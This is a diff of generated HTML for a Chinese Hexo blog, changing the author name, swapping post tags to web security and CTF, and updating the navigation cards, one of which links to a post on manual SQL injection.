                     <a href="https://creativecommons.org/licenses/by/4.0/deed.zh" rel="external nofollow noreferrer" target="_blank">CC BY 4.0</a>
                     许可协议。转载请注明来源
-                    <a href="/about" target="_blank">0xhowahh</a>
+                    <a href="/about" target="_blank">0xahh</a>
                     !
                 </span>
             </div>
@@ -665,8 +716,12 @@ _   下划线
                     
                         <div class="article-tag">
                             
-                                <a href="/tags/markdown/">
-                                    <span class="chip bg-color">markdown</span>
+                                <a href="/tags/web%E5%AE%89%E5%85%A8/">
+                                    <span class="chip bg-color">web安全</span>
+                                </a>
+                            
+                                <a href="/tags/CTF/">
+                                    <span class="chip bg-color">CTF</span>
                                 </a>
                             
                         </div>
@@ -834,29 +889,84 @@ _   下划线
 <article id="prenext-posts" class="prev-next articles">
     <div class="row article-row">
         
-        <div class="article col s12 m6" data-aos="fade-up">
+        <div class="article col s12 m6" data-aos="fade-up" data-aos="fade-up">
             <div class="article-badge left-badge text-color">
-                <i class="fas fa-chevron-left"></i>&nbsp;上一篇</div>
+                <i class="far fa-dot-circle"></i>&nbsp;本篇
+            </div>
             <div class="card">
-                <a href="/2020/09/15/pa-chong-qian-zhi/">
+                <a href="/2020/09/22/sqlinjection/">
                     <div class="card-image">
                         
                         
-                        <img src="/medias/featureimages/0.jpg" class="responsive-img" alt="爬虫前置">
+                        <img src="/medias/featureimages/7.jpg" class="responsive-img" alt="SqlInjection">
                         
-                        <span class="card-title">爬虫前置</span>
+                        <span class="card-title">SqlInjection</span>
                     </div>
                 </a>
                 <div class="card-content article-content">
                     <div class="summary block-with-text">
                         
-                            爬虫前置知识
+                            sql手动注入原理记录
                         
                     </div>
                     <div class="publish-info">
-                        <span class="publish-date">
-                            <i class="far fa-clock fa-fw icon-date"></i>2020-09-15
+                            <span class="publish-date">
+                                <i class="far fa-clock fa-fw icon-date"></i>2020-09-22
+                            </span>
+                        <span class="publish-author">
+                            
+                            <i class="fas fa-bookmark fa-fw icon-category"></i>
+                            
+                            <a href="/categories/web%E5%AE%89%E5%85%A8/" class="post-category">
+                                    web安全
+                                </a>
+                            
+                            
                         </span>
+                    </div>
+                </div>
+
+                
+                <div class="card-action article-tags">
+                    
+                    <a href="/tags/web%E5%AE%89%E5%85%A8/">
+                        <span class="chip bg-color">web安全</span>
+                    </a>
+                    
+                    <a href="/tags/CTF/">
+                        <span class="chip bg-color">CTF</span>
+                    </a>
+                    
+                </div>
+                
+            </div>
+        </div>
+        
+        
+        <div class="article col s12 m6" data-aos="fade-up">
+            <div class="article-badge right-badge text-color">
+                下一篇&nbsp;<i class="fas fa-chevron-right"></i>
+            </div>
+            <div class="card">
+                <a href="/2020/09/15/ji-chu-ku-de-shi-yong/">
+                    <div class="card-image">
+                        
+                        
+                        <img src="/medias/featureimages/0.jpg" class="responsive-img" alt="基础库的使用">
+                        
+                        <span class="card-title">基础库的使用</span>
+                    </div>
+                </a>
+                <div class="card-content article-content">
+                    <div class="summary block-with-text">
+                        
+                            爬虫基础库的介绍
+                        
+                    </div>
+                    <div class="publish-info">
+                            <span class="publish-date">
+                                <i class="far fa-clock fa-fw icon-date"></i>2020-09-15
+                            </span>
                         <span class="publish-author">
                             
                             <i class="fas fa-bookmark fa-fw icon-category"></i>
@@ -878,51 +988,6 @@ _   下划线
                     
                     <a href="/tags/%E7%88%AC%E8%99%AB/">
                         <span class="chip bg-color">爬虫</span>
-                    </a>
-                    
-                </div>
-                
-            </div>
-        </div>
-        
-        
-        <div class="article col s12 m6" data-aos="fade-up">
-            <div class="article-badge right-badge text-color">
-                下一篇&nbsp;<i class="fas fa-chevron-right"></i>
-            </div>
-            <div class="card">
-                <a href="/2020/08/31/hello-world/">
-                    <div class="card-image">
-                        
-                        
-                        <img src="/medias/featureimages/12.jpg" class="responsive-img" alt="Hello World">
-                        
-                        <span class="card-title">Hello World</span>
-                    </div>
-                </a>
-                <div class="card-content article-content">
-                    <div class="summary block-with-text">
-                        
-                            第一篇博客，简要记录心路历程以及发布hexo博客的注意事项
-                        
-                    </div>
-                    <div class="publish-info">
-                            <span class="publish-date">
-                                <i class="far fa-clock fa-fw icon-date"></i>2020-08-31
-                            </span>
-                        <span class="publish-author">
-                            
-                            <i class="fas fa-user fa-fw"></i>
-                            0xhowahh
-                            
-                        </span>
-                    </div>
-                </div>
-                
-                <div class="card-action article-tags">
-                    
-                    <a href="/tags/hexo/">
-                        <span class="chip bg-color">hexo</span>
                     </a>
                     
                 </div>
